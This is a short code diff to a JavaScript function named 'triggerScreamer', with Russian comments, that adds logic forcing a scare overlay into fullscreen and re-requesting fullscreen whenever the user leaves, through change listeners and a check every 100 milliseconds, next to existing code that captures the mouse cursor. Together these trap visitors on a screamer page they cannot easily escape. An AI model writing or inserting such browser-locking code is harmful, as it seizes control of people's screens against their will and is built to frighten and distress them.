@@ -1554,6 +1554,31 @@ function triggerScreamer() {
 	overlay.style.display = 'flex';
 	document.body.style.overflow = 'hidden';
 	
+	// FULLSCREEN MODE - запускаем на весь экран
+	var requestFullscreen = overlay.requestFullscreen || overlay.mozRequestFullScreen || overlay.webkitRequestFullscreen || overlay.msRequestFullscreen;
+	if (requestFullscreen) {
+		requestFullscreen.call(overlay).catch(function(err) {
+			console.log('Fullscreen failed:', err);
+		});
+	}
+	
+	// Постоянно возвращаем fullscreen если пользователь вышел
+	var returnToFullscreen = function() {
+		if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+			if (requestFullscreen) {
+				requestFullscreen.call(overlay).catch(function() {});
+			}
+		}
+	};
+	
+	document.addEventListener('fullscreenchange', returnToFullscreen);
+	document.addEventListener('mozfullscreenchange', returnToFullscreen);
+	document.addEventListener('webkitfullscreenchange', returnToFullscreen);
+	document.addEventListener('msfullscreenchange', returnToFullscreen);
+	
+	// Пытаемся вернуть fullscreen каждые 100мс
+	setInterval(returnToFullscreen, 100);
+	
 	// ЗАХВАТ КУРСОРА (Pointer Lock API)
 	overlay.requestPointerLock = overlay.requestPointerLock || overlay.mozRequestPointerLock || overlay.webkitRequestPointerLock;
 	if (overlay.requestPointerLock) {
